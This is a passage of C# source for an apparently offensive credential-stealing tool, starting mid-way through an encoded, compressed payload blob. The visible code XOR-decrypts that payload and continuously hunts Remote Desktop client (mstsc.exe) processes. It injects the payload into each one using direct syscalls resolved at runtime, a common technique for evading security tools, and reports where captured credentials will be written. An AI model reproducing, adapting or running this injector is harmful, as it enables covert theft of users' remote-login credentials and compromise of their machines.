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");
            var rDllRawBytes = Decompress(rDllCompressed);

            HashSet<int> PIDs = new HashSet<int>();
            Console.WriteLine("[*] Joined the hunt for mstsc.exe processes...");
            while (true)
            {
                Process[] mstscProc = Process.GetProcessesByName("mstsc");
                if (mstscProc.Length > 0)
                {
                    for (int i = 0; i < mstscProc.Length; i++)
                    {
                        int processId = mstscProc[i].Id;
                        if (!PIDs.Contains(processId))
                        {
                            Console.WriteLine($"[+] Detected non-hooked process with PID={processId}");

                            // NtOpenProcess
                            IntPtr stub = DoItDynamicallyBabe.DynGen.GetSyscallStub("NtOpenProcess");
                            NtOpenProcess ntOpenProcess = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcess));

                            IntPtr hProcess = IntPtr.Zero;
                            DoItDynamicallyBabe.Native.OBJECT_ATTRIBUTES oa = new DoItDynamicallyBabe.Native.OBJECT_ATTRIBUTES();

                            DoItDynamicallyBabe.Native.CLIENT_ID ci = new DoItDynamicallyBabe.Native.CLIENT_ID
                            {
                                UniqueProcess = (IntPtr)processId
                            };

                            DoItDynamicallyBabe.Native.NTSTATUS result = ntOpenProcess(
                                ref hProcess,
                                0x001F0FFF,
                                ref oa,
                                ref ci);

                            if (result == 0)
                                Console.WriteLine("[+] NtOpenProcess succeeded!");
                            else
                                Console.WriteLine($"[-] NtOpenProcess failed: {result}");

                            // NtAllocateVirtualMemory
                            stub = DoItDynamicallyBabe.DynGen.GetSyscallStub("NtAllocateVirtualMemory");
                            NtAllocateVirtualMemory ntAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));

                            IntPtr baseAddress = IntPtr.Zero;
                            IntPtr regionSize = (IntPtr)rDllRawBytes.Length;

                            result = ntAllocateVirtualMemory(
                                hProcess,
                                ref baseAddress,
                                IntPtr.Zero,
                                ref regionSize,
                                0x1000 | 0x2000,
                                0x04);

                            if (result == 0)
                                Console.WriteLine("[+] NtAllocateVirtualMemory succeeded!");
                            else
                                Console.WriteLine($"[-] NtAllocateVirtualMemory failed: {result}");

                            // NtWriteVirtualMemory
                            stub = DoItDynamicallyBabe.DynGen.GetSyscallStub("NtWriteVirtualMemory");
                            NtWriteVirtualMemory ntWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));

                            // XOR-decrypt the shellcode
                            for (int j = 0; j < rDllRawBytes.Length; j++)
                            {
                                rDllRawBytes[j] = (byte)(rDllRawBytes[j] ^ (byte)'q');
                            }

                            var buffer = Marshal.AllocHGlobal(rDllRawBytes.Length);
                            Marshal.Copy(rDllRawBytes, 0, buffer, rDllRawBytes.Length);

                            uint bytesWritten = 0;

                            result = ntWriteVirtualMemory(
                                hProcess,
                                baseAddress,
                                buffer,
                                (uint)rDllRawBytes.Length,
                                ref bytesWritten);

                            if (result == 0)
                                Console.WriteLine("[+] NtWriteVirtualMemory succeeded!");
                            else
                                Console.WriteLine($"[-] NtWriteVirtualMemory failed: {result}");

                            Marshal.FreeHGlobal(buffer);

                            // NtProtectVirtualMemory
                            stub = DoItDynamicallyBabe.DynGen.GetSyscallStub("NtProtectVirtualMemory");
                            NtProtectVirtualMemory ntProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));

                            uint oldProtect = 0;

                            result = ntProtectVirtualMemory(
                                hProcess,
                                ref baseAddress,
                                ref regionSize,
                                0x20,
                                ref oldProtect);

                            if (result == 0)
                                Console.WriteLine("[+] NtProtectVirtualMemory succeeded!");
                            else
                                Console.WriteLine($"[-] NtProtectVirtualMemory failed: {result}");

                            // NtCreateThreadEx
                            stub = DoItDynamicallyBabe.DynGen.GetSyscallStub("NtCreateThreadEx");
                            NtCreateThreadEx ntCreateThreadEx = (NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateThreadEx));

                            IntPtr hThread = IntPtr.Zero;

                            result = ntCreateThreadEx(
                                out hThread,
                                DoItDynamicallyBabe.Win32.Advapi32.ACCESS_MASK.MAXIMUM_ALLOWED,
                                IntPtr.Zero,
                                hProcess,
                                baseAddress,
                                IntPtr.Zero,
                                false,
                                0,
                                0,
                                0,
                                IntPtr.Zero);

                            if (result == 0)
                            {
                                Console.WriteLine("[+] NtCreateThreadEx succeeded!");
                                Console.WriteLine($"[*] Process {processId} is now hooked, look for creds in \"{System.IO.Path.GetTempPath()}\"");
                                PIDs.Add(processId);
                            }
                            else
                                Console.WriteLine($"[-] NtCreateThreadEx failed: {result}");
                        }
                    }
                }

                Thread.Sleep(5000);
            }
        }
    }
}
